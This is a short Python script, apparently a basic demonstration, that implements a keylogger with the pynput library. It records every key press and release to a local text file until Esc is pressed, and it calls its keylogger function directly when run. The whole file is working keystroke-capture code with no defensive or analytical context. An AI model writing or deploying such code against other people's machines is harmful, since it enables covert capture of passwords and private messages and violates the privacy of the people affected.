from pynput import keyboard

def keylogger():
    def on_press(key):
        try:
            with open("file.txt" ,'a') as f:
                f.write(" alphanumeric key {0} pressed \n".format(key.char))
        except AttributeError:
            with open("file.txt",'a') as f:
                f.write(" special key {0} pressed \n".format(key))
        
    def on_release(key):
        with open("file.txt",'a') as f:
            f.write(" {0} released \n".format(key))
        if key==keyboard.Key.esc:
            return False
    
    with keyboard.Listener(on_press=on_press,on_release=on_release) as listener:
        listener.join()

keylogger()